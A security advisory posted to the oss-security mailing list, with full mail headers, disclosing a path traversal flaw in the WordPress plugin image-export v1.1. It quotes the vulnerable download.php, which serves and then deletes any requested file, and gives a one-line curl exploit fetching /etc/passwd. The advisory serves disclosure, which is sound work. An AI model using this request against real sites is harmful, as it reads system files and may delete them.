X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1359" "Monday" "13" "July" "2015" "19:20:50" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<395B9BB0-1170-49A0-9799-9925DA61731D@me.com>" "36" "[oss-security] Remote file download vulnerability in Wordpress Plugin image-export v1.1" nil nil nil "7" "2015071323:20:50" "[oss-security] Remote file download vulnerability in Wordpress Plugin image-export v1.1" (number mark "U       larry0@me.co Jul 13   36/1359  " thread-indent "\"[oss-security] Remote file download vulnerability in Wordpress Plugin image-export v1.1\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7867 invoked by uid 550); 13 Jul 2015 23:21:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7826 invoked from network); 13 Jul 2015 23:21:03 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-13_10:2015-07-13,2015-07-13,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507130341
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Date: Mon, 13 Jul 2015 19:20:50 -0400
To: Open Source Security <oss-security@lists.openwall.com>
Message-id: <395B9BB0-1170-49A0-9799-9925DA61731D@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download vulnerability in Wordpress Plugin image-export
 v1.1

Title: Remote file download vulnerability in Wordpress Plugin image-export =
v1.1
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-01
Download Site: https://wordpress.org/plugins/image-export
Vendor: www.1efthander.com
Vendor Notified: 2015-07-05
Vendor Contact: https://twitter.com/1eftHander
Description: Image Export plugin can help you selectively download images u=
ploaded by an administrator .
Vulnerability:
The code in file download.php doesn't do any checking that the user is requ=
esting files from the uploaded images directory only.  And line 8 attempts =
to
unlink the file after being downloaded.  This script could be used to delet=
e files out of the wordpress directory if file permissions allow.
=20
      1 <?php
      2 if ( isset( $_REQUEST['file'] ) && !empty( $_REQUEST['file'] ) ) {
      3         $file =3D $_GET['file'];
      4=20
      5         header( 'Content-Type: application/zip' );
      6         header( 'Content-Disposition: attachment; filename=3D"' . $=
file . '"' );
      7         readfile( $file );
      8         unlink( $file );
      9=20=20=20=20=20=20=20=20=20
     10         exit;
     11 }
     12 ?>
CVEID: TBD
Exploit Code:
	=E2=80=A2 $ curl http://example.com/wp-content/plugins/image-export/downlo=
ad.php?file=3D/etc/passwd
Screen Shots:
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D135=
